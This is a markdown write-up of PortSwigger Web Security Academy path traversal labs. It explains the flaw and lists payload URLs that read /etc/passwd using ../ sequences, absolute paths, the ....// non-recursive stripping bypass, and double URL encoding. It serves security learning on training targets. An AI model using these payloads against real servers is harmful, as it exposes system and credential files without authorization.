## Path Traversal

In general, a web application stores files on a server and loads a particular file based on the user's request.

If the application does not properly restrict which files can be accessed, an attacker may be able to access unauthorized files that were
not intended to be accessible to them, potentially exposing sensitive information.

This can happen by manipulating the file path or filename supplied to the application, causing the server to access a different file than
the developer intended.

### LAB - 1

***Path Traversal - /etc/passwd in img file source***

img file source is vulnerable to the path traversal.

open the image in another tab so it exposes the parameter that it uses.

```https://0a5e00ed042f6032858d713a008600bf.web-security-academy.net/image?filename=10.jpg```

parameter name : ```filename```

**payload :**  ```https://0a5e00ed042f6032858d713a008600bf.web-security-academy.net/image?filename=../../../etc/passwd```

it gives the response but not visible in the browser because the filename parameter is resided inside the ```img html tag``` which cannot
render text.

<img width="803" height="807" alt="Screenshot 2026-09-14 at 18 24 31" src="https://github.com/user-attachments/assets/7f4f8bc4-54d3-42c7-b6f0-2123333c9062" />


### LAB - 2

**path traversal, traversal sequences(../) blocked with absolute path bypass**

../ is blocked in the parameter value.
absolute path is allowed we can directly get the output.

```absolute path``` - reads the ```/``` as the root directory level.

```payload :: https://0a9f000304c9825982999db400a3008f.web-security-academy.net/image?filename=/etc/passwd```

It is currently working in the application directory something like /var/www/html but reads the file path from root.



#### technique to override the blocking of traversal sequence(../)

```....//``` - can be used because the application changes that into ```../``` unknowingly.

application reads ```....//``` and it will instructed to change the ```../``` to empty string("").

reads first 3 characters ```...``` and compares ```../```, not matching then go to next set of three characters and eventually gets
```../``` and now it removes that ```../``` and concatenates the first ``..`` and the last `/` transforming it to ``../``.


### LAB - 3

**traversal sequences stripped non-recursively**

above technique is the solution for this lab.

```payload :: https://0a80007c03d6d63f849de3b5009900b4.web-security-academy.net/image?filename=....//....//....//etc/passwd```


### URL encoding of the traversal sequence to bypass input validation filters

encoding of ../ - %2e%2e%2f 
double encoding of ../ - %252e%252e%252f


### LAB - 4

**URL decoding happens in browser as well as in the server (Double encoding payload required)**

same like above use ```%252e%252e%252f``` as the replacement of ```../```.

```payload - https://0a7c004504dbc5ca802d762a008900aa.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd```


